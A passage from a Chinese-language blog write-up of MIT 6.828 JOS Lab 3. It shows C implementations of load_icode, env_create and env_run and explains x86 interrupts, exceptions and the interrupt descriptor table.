class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Set up the initial program binary, stack, and processor flags</span></span><br><span class="line"><span class="comment">// for a user process.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function loads all loadable segments from the ELF binary image</span></span><br><span class="line"><span class="comment">// into the environment&#x27;s user memory, starting at the appropriate</span></span><br><span class="line"><span class="comment">// virtual addresses indicated in the ELF program header.</span></span><br><span class="line"><span class="comment">// At the same time it clears to zero any portions of these segments</span></span><br><span class="line"><span class="comment">// that are marked in the program header as being mapped</span></span><br><span class="line"><span class="comment">// but not actually present in the ELF file - i.e., the program&#x27;s bss section.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// All this is very similar to what our boot loader does, except the boot</span></span><br><span class="line"><span class="comment">// loader also needs to read the code from disk.  Take a look at</span></span><br><span class="line"><span class="comment">// boot/main.c to get ideas.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Finally, this function maps one page for the program&#x27;s initial stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// load_icode panics if it encounters problems.</span></span><br><span class="line"><span class="comment">//  - How might load_icode fail?  What might be wrong with the given input?</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>主要还是苦力活，解析 ELF header，选出可载入段（<code>ph-&gt;p_type == ELF_PROG_LOAD</code>），分配内存，在页表中建立映射，不过这里提示我们可以抄一抄 <code>boot/main.c</code> 中的解析方法（<del>那👴当然要抄🌶</del>）</p><blockquote><p> 关于 ELF 格式网上大把资料，不会的可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90</a></p></blockquote><p>这里我们需要注意的是，由于我们仅需要在用户空间建立映射，而我们在分配完空间之后还需要将数据拷贝上去，考虑到用户空间页表中也映射了内核空间，<strong>我们可以先切换到用户页表处理数据，完成之后再切换回内核页表</strong>，在 JOS 中提供了一个 <code>lcr3()</code> 让我们能直接更改 cr3 寄存器的值（该寄存器中存放着页目录表的地址）</p><p>别忘了将 ELF header 中的 entry （<strong>程序入口点</strong>）给到 Env 结构体中寄存器结构体的 eip</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">load_icode</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">uint8_t</span> *binary)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//  Load each program segment into virtual memory</span></span><br><span class="line"><span class="comment">//  at the address specified in the ELF segment header.</span></span><br><span class="line"><span class="comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span></span><br><span class="line"><span class="comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span></span><br><span class="line"><span class="comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span></span><br><span class="line"><span class="comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span></span><br><span class="line"><span class="comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span></span><br><span class="line"><span class="comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span></span><br><span class="line"><span class="comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span></span><br><span class="line"><span class="comment">//  Use functions from the previous lab to allocate and map pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  All page protection bits should be user read/write for now.</span></span><br><span class="line"><span class="comment">//  ELF segments are not necessarily page-aligned, but you can</span></span><br><span class="line"><span class="comment">//  assume for this function that no two segments will touch</span></span><br><span class="line"><span class="comment">//  the same virtual page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You may find a function like region_alloc useful.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Loading the segments is much simpler if you can move data</span></span><br><span class="line"><span class="comment">//  directly into the virtual addresses stored in the ELF binary.</span></span><br><span class="line"><span class="comment">//  So which page directory should be in force during</span></span><br><span class="line"><span class="comment">//  this function?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You must also do something with the program&#x27;s entry point,</span></span><br><span class="line"><span class="comment">//  to make sure that the environment starts executing there.</span></span><br><span class="line"><span class="comment">//  What?  (See env_run() and env_pop_tf() below.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elfhdr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">ustack</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check ELF magic</span></span><br><span class="line">elfhdr = (<span class="keyword">struct</span> Elf*) binary;</span><br><span class="line"><span class="keyword">if</span> (elfhdr-&gt;e_magic != ELF_MAGIC)</span><br><span class="line">panic(<span class="string">&quot;Invalid ELF header!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch to user pgdir</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="comment">// analyze the header table and copy data</span></span><br><span class="line">ph = (<span class="keyword">struct</span> Proghdr *) (binary + elfhdr-&gt;e_phoff);</span><br><span class="line">eph = ph + elfhdr-&gt;e_phnum;</span><br><span class="line"><span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_type != ELF_PROG_LOAD)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">region_alloc(e, (<span class="type">void</span>*)ph-&gt;p_va, ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span>*)(ph-&gt;p_va), <span class="number">0</span>, ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)(ph-&gt;p_va), (<span class="type">void</span>*)(binary + ph-&gt;p_offset), ph-&gt;p_filesz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the entry point</span></span><br><span class="line">e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now map one page for the program&#x27;s initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">region_alloc(e, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), PGSIZE);</span><br><span class="line">ustack = page_lookup(e-&gt;env_pgdir, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), <span class="literal">NULL</span>);</span><br><span class="line">page_insert(kern_pgdir, ustack, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), PTE_U | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// recover kernel pgdir</span></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-create-：创建进程环境"><a href="#env-create-：创建进程环境" class="headerlink" title="env_create()：创建进程环境"></a>env_create()：创建进程环境</h4><p>调用 <code>env_alloc()</code> 分配 PCB、调用 <code>load_icode()</code> 解析载入 ELF 即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocates a new env with env_alloc, loads the named elf</span></span><br><span class="line"><span class="comment">// binary into it with load_icode, and sets its env_type.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">// The new env&#x27;s parent ID is set to 0.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">new_env</span>;</span></span><br><span class="line"><span class="keyword">switch</span>(env_alloc(&amp;new_env, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">// success</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> -E_NO_FREE_ENV:</span><br><span class="line">panic(<span class="string">&quot;No free Env now!&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> -E_NO_MEM:</span><br><span class="line">panic(<span class="string">&quot;OOM while alloc the Env!&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">panic(<span class="string">&quot;unknown fault from env_alloc!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_env-&gt;env_type = type;</span><br><span class="line">load_icode(new_env, binary);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-run-：将进程加入运行队列"><a href="#env-run-：将进程加入运行队列" class="headerlink" title="env_run()：将进程加入运行队列"></a>env_run()：将进程加入运行队列</h4><p>分为三步走：</p><ul><li>若当前有进程在运行（curenv !&#x3D; NULL)，将其状态设为 <code>ENV_RUNNABLE</code></li><li>将 curenv 设为待运行进程的 Env并改变其状态、增加运行次数计数，切换到用户页表</li><li>恢复用户进程运行上下文，从内核态切换到用户态</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Context switch from curenv to env e.</span></span><br><span class="line"><span class="comment">// Note: if this is the first call to env_run, curenv is NULL.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function does not return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Step 1: If this is a context switch (a new environment is running):</span></span><br><span class="line"><span class="comment">//   1. Set the current environment (if any) back to</span></span><br><span class="line"><span class="comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span></span><br><span class="line"><span class="comment">//      what other states it can be in),</span></span><br><span class="line"><span class="comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span></span><br><span class="line"><span class="comment">//   3. Set its status to ENV_RUNNING,</span></span><br><span class="line"><span class="comment">//   4. Update its &#x27;env_runs&#x27; counter,</span></span><br><span class="line"><span class="comment">//   5. Use lcr3() to switch to its address space.</span></span><br><span class="line"><span class="comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span></span><br><span class="line"><span class="comment">//   registers and drop into user mode in the</span></span><br><span class="line"><span class="comment">//   environment.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Hint: This function loads the new environment&#x27;s state from</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf.  Go back through the code you wrote above</span></span><br><span class="line"><span class="comment">//and make sure you have set the relevant parts of</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf to sensible values.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (curenv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (curenv-&gt;env_status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNING:</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNABLE:</span><br><span class="line"><span class="keyword">case</span> ENV_NOT_RUNNABLE:</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ENV_FREE:</span><br><span class="line">panic(<span class="string">&quot;running a free Env!&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> ENV_DYING:</span><br><span class="line">panic(<span class="string">&quot;running a dying Env!&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">panic(<span class="string">&quot;The env is crashed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the curenv</span></span><br><span class="line">curenv = e;</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNING;</span><br><span class="line">curenv-&gt;env_runs++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// recover the context of process and ret2usr</span></span><br><span class="line">lcr3(PADDR(curenv-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;curenv-&gt;env_tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// we never arrive there</span></span><br><span class="line">panic(<span class="string">&quot;env_run not yet implemented&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成这一切后，我们来跑一下这份代码，<strong>你会发现内核成功地运行了程序 hello，并在其尝试调用 0x30号中断时 触发了 triple fault 导致运行暂停</strong></p><p><img src="https://s2.loli.net/2022/03/17/5E9QxkMsrFnKoOq.png" alt="image.png"></p><p>那为什么会触发 triple fault 呢？如同 32位 Linux kernel 所做的一般，JOS 也将系统调用实现为一个中断，这便是第一个 fault（需要注意 fault 并非都代表错误，很多机制其实是通过这种“fault”的触发而实现的）；而由于 JOS 尚未设置中断处理程序，因此 CPU 会生成一个 general protection exception，这便是 double fault；然后 CPU 又要处理生成的这个 exception，但是没有对应的处理程序（套娃了），于是就 triple fault 了，但是这并不会无限嵌套下去，在 triple fault 的时候系统就完全无法运行了，通常情况下就重启了，因为我们是 patched qemu 所以会被 qemu 挂起</p><h3 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h3><p>因此接下来我们来实现中断处理与异常处理，首先是 Exercise 3，阅读了解中断与异常相关基础知识</p><blockquote><p><strong>Exercise 3.</strong> Read <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c09.htm">Chapter 9, Exceptions and Interrupts</a> in the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">80386 Programmer’s Manual</a> (or Chapter 5 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">IA-32 Developer’s Manual</a>), if you haven’t already.</p></blockquote><p><strong>中断</strong>（interrupt）与<strong>异常</strong>（exception）是两种特别的改变控制流的方式，其工作原理类似于非编程式的 <code>call</code> 指令——改变正常的程序流程以处理外部事件或报告错误与异常情况</p><p>中断与异常的区别在于中断用以处理处理器外的异步事件，而异常则是处理器在运行时检测到异常事件后的处理</p><p>中断与异常通常有如下来源：</p><ul><li>中断：<ul><li>可屏蔽中断，通过 INTR 引脚发出</li><li>不可屏蔽中断，通过 NMI 引脚发出</li></ul></li><li>异常：<ul><li>由处理器检测到的，具体可分为 faults、traps 与 aborts</li><li>编程式的，通过指令 into、int 3、int n、bound 可触发异常，通常称之为“软中断”，但处理器将其作为异常来处理</li></ul></li></ul><h4 id="Identify-Interrupts"><a href="#Identify-Interrupts" class="headerlink" title="Identify Interrupts"></a>Identify Interrupts</h4><p>处理器将不同的中断与异常进行独立标号，其中 NMI 与异常对应标号 0 ~ 31（并非所有标号都有对应用途，部分标号为未来保留）；可屏蔽中断的标识符由外部中断控制器（例如 Intel 8259A 的可编程中断控制器（Programmable Interrupt Controller））确定，并在处理器的中断确认序列中与处理器通信，8259A 的 PIC 分配的标号可以由软件指定，范围为 32 ~ 255</p><p>根据异常报告的方式与是否支持重启指令将其分为三类：</p><ul><li><p>Faults：在“指令造成异常前”被报告的异常，可以是在指令开始执行时或是执行过程中被检测到，若在执行指令时检测到异常，则会保存当前上下文，完成异常处理后再恢复上下文，<strong>重新从造成异常的指令开始执行</strong></p><blockquote><p>举个🌰：Linux 中的 page fault 就是这样的一种异常，当读写尚未分配内存页的地址时（比如说 mmap 分配了一个 vma 但是还没分配物理页框）便会触发缺页异常处理程序，分配内存页后再重新从读写的指令开始运行</p></blockquote></li><li><p>Traps：在检测到异常的指令后立即在指令边界报告的异常（<del>别问，👴也没看懂英文原文啥意思</del>）</p><blockquote><p>举个🌰：系统调用的流程简化后类似于一个陷阱，用户态进程布置好数据后通过指令陷入到内核态，内核完成处理后再返回用户态，执行下一条指令</p></blockquote></li><li><p>Aborts：是一种既不精确定位指令也不重启程序的异常，通常用来报告<strong>严重的错误</strong>（例如硬件错误或非法值）</p><blockquote><p>例如除以 0 可能就是一种 Abort？</p></blockquote></li></ul><p>下表显示了中断与异常对应类型的标识符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Table 9-1. Interrupt and Exception ID Assignments</span><br><span class="line"></span><br><span class="line">Identifier   Description</span><br><span class="line"></span><br><span class="line">0            Divide error</span><br><span class="line">1            Debug exceptions</span><br><span class="line">2            Nonmaskable interrupt</span><br><span class="line">3            Breakpoint (one-byte INT 3 instruction)</span><br><span class="line">4            Overflow (INTO instruction)</span><br><span class="line">5            Bounds check (BOUND instruction)</span><br><span class="line">6            Invalid opcode</span><br><span class="line">7            Coprocessor not available</span><br><span class="line">8            Double fault</span><br><span class="line">9            (reserved)</span><br><span class="line">10           Invalid TSS</span><br><span class="line">11           Segment not present</span><br><span class="line">12           Stack exception</span><br><span class="line">13           General protection</span><br><span class="line">14           Page fault</span><br><span class="line">15           (reserved)</span><br><span class="line">16           Coprecessor error</span><br><span class="line">17-31        (reserved)</span><br><span class="line">32-255       Available for external interrupts via INTR pin</span><br></pre></td></tr></table></figure><h4 id="Enabling-and-Disabling-Interrupts"><a href="#Enabling-and-Disabling-Interrupts" class="headerlink" title="Enabling and Disabling Interrupts"></a>Enabling and Disabling Interrupts</h4><p>若多个中断同时发生，我们不应当在处理一个中断时跑去处理另一个中断，因此需要明确什么时候能进行中断处理</p><p>对于不可屏蔽中断而言，处理器在执行到 iret 指令之前都会忽略 NMI 引脚上的中断信号</p><p>对于可屏蔽中断而言，当 IF 标志位为 0 时中断被关闭，只有在 IF &#x3D;&#x3D; 1时才能进行，与其他标志位一样，在处理器重置时 IF 会被清空，我们可以通过 <code>cli</code> 与 <code>sli</code> 指令清空或设置 IF 标志位，这两个指令只有在 CLI （特权级）&lt;&#x3D; IOPL 时才可用，否则会触发保护异常</p><p>IF 标志位还会被这些操作影响：</p><ul><li><code>pushf</code> 指令将 eflags 寄存器的值推到栈上</li><li>在任务切换时会调用 <code>popf</code> 与 <code>iret</code> 指令载入标志位寄存器</li><li>在通过中断门时会自动重置 IF 标志位，关闭中断</li></ul><p>RF 标志位用以控制 debug fault，对于给定指令其最多会被触发一次</p><p>对 ss 寄存器的更改（mov 或 pop）也会影响一些中断与异常，例如我们改变堆栈（<code>ss:esp</code>）的过程中（刚好改了 ss 没改 esp）处理了中断或异常，则堆栈指针在中断&#x2F;异常处理的过程中是不一致的，因此 80386 在更改 ss 的指令后的指令边界处禁止 NMI、INTR、debug fault 或单步陷阱，可能会有例外：page fault 或 general protection fault，因此我们需要使用 80386 的 <code>lss</code> 指令</p><h4 id="Priority-Among-Simultaneous-Interrupts-and-Exceptions"><a href="#Priority-Among-Simultaneous-Interrupts-and-Exceptions" class="headerlink" title="Priority Among Simultaneous Interrupts and Exceptions"></a>Priority Among Simultaneous Interrupts and Exceptions</h4><p>中断与异常的处理同样有着优先级，处理器会先处理高优先级的异常而丢弃低优先级的异常，当中断处理返回时会发现被丢弃的异常并重新处理；优先级顺序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Table 9-2. Priority Among Simultaneous Interrupts and Exceptions</span><br><span class="line"></span><br><span class="line">Priority   Class of Interrupt or Exception</span><br><span class="line"></span><br><span class="line">HIGHEST    Faults except debug faults</span><br><span class="line">Trap instructions INTO, INT n, INT 3</span><br><span class="line">Debug traps for this instruction</span><br><span class="line">Debug faults for next instruction</span><br><span class="line">NMI interrupt</span><br><span class="line">LOWEST     INTR interrupt</span><br></pre></td></tr></table></figure><h4 id="Interrupt-Descriptor-Table"><a href="#Interrupt-Descriptor-Table" class="headerlink" title="Interrupt Descriptor Table"></a>Interrupt Descriptor Table</h4><p>类似于段描述符表，中断同样有着对应的<strong>门描述符</strong>（Gate Descriptor）结构与一张<strong>中断描述符表</strong>（Interrupt Descriptor Table），不同于 GDT 与 LDT，IDT 的第一个描述符是可用的，因为中断与异常一共有着 256 个标号，因此一张中断描述符表上最多可以有 256 个中断描述符（也可以少于这个数量）</p><p>中断描述符表的地址存放在 IDT 寄存器（IDTR）中，我们可以通过 <code>lidt</code> 指令（通过线性地址装载 IDT，只能在 0 特权级下执行）与 <code>sidt</code> 指令（拷贝当前 IDTR 的值，可以在任何特权级下执行）操作 IDTR</p><p>中断描述符表的结构如下：</p><p><img src="https://s2.loli.net/2022/03/17/vPQKmeGVhyJ3ADT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/17/5WujsrOYPpkMIze.png" alt="image.png"></p><h4 id="IDT-Descriptor"><a href="#IDT-Descriptor" class="headerlink" title="IDT Descriptor"></a>IDT Descriptor</h4><p>中断描述符表中包含如下三种描述符：</p><ul><li>任务门（用作任务切换，后面可能会讲到）</li><li>中断门</li><li>陷阱门</li></ul><p>描述符的结构如下所示</p><p><img src="https://s2.loli.net/2022/03/17/Q3GiDPscdyKmLIT.png" alt="image.png"></p><h4 id="Interrupt-Procedures"><a href="#Interrupt-Procedures" class="headerlink" title="Interrupt Procedures"></a>Interrupt Procedures</h4><p>如同 call 指令一般，中断与异常其实就是“call”中断处理程序——处理器通过中断或异常标号作为 IDT 的索引找到对应的中断描述符，若是一个中断门或陷阱门则其会以类似“call”调用门的方式调用处理程序，若是一个任务门，则会以类似“call”任务门的方式引起任务切换</p><p>中断门与陷阱门并不直接指向处理程序，而是通过下图的方式找到处理程序地址：门的选择子指向一个 GDT&#x2F;LDT 中的可执行段，门的 offset 域指向中断&#x2F;异常处理程序的开头</p><p><img src="https://s2.loli.net/2022/03/17/yoAXZpNmQDS3Vvr.png" alt="image.png"></p><p>如同 call 指令引起的控制流转移一般，中断与异常的处理过程同样使用堆栈存储返回原始过程所需的信息，并使用 iret 指令从栈上恢复这些信息，如同下图所示：</p><p><img src="https://s2.loli.net/2022/03/17/qWnwvs9NreXpuiD.png" alt="image.png"></p><p>在通过中断门或陷阱门后会将 eflags 存到栈上，并重置 TF （trap flag）标志位，以此防止单步执行的调试过程影响中断响应，完成后 iret 指令会从栈上恢复 eflags，需要注意的是通过中断门后会重置 IF ，但通过陷阱门并不会重置 IF</p><p>在中断过程中 CPU 不允许将控制权转移到低于当前特权级的段上，否则会触发 general protection fault，因此我们可以通过任一下列策略防止这种情况的发生：</p><ul><li>将处理程序放在合适的段中，这样的策略适合一些特殊的异常处理程序（例如 divided by zero），这样的处理程序必须仅使用堆栈中的可用数据，若其需要来自数据段的数据，则需要确保数据段的特权级为 3，从而使其不受访问保护</li><li>将处理程序放在特权级 0 的段中</li></ul><h4 id="Interrupt-Tasks"><a href="#Interrupt-Tasks" class="headerlink" title="Interrupt Tasks"></a>Interrupt Tasks</h4><p>IDT 中的任务门并不直接指向一个任务，如同下图所示，门的选择子指向 GDT 中的一个 TSS 描述符，当中断或异常触发通过任务门时，将会进行任务的切换</p><p><img src="https://s2.loli.net/2022/03/17/GZBLwKDji6f7gdC.png" alt="image.png"></p><p>使用一个独立的任务来处理中断有如下优点：</p><ul><li>会自动保存进程上下文</li><li>中断处理程序可以通过一个单独的地址空间与其他任务独立开来，比如通过一个 LDT 或 独立页表</li></ul><p>任务的切换参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c07.htm">Chapter 7</a>.，需要说明的是中断任务同样通过 iret 指令返回原进程；若是任务切换是由一个带着错误代码的异常引起的，则处理器会自动将错误代码存到处理程序的栈上</p><p>在 80386 中使用中断任务时，实际上有两个调度器：软件调度器（OS的一部分）与硬件调度器（处理器中断机制的一部分），软件调度器的设计应该考虑到硬件调度器可以在启用中断时调度中断任务这一事实</p><h4 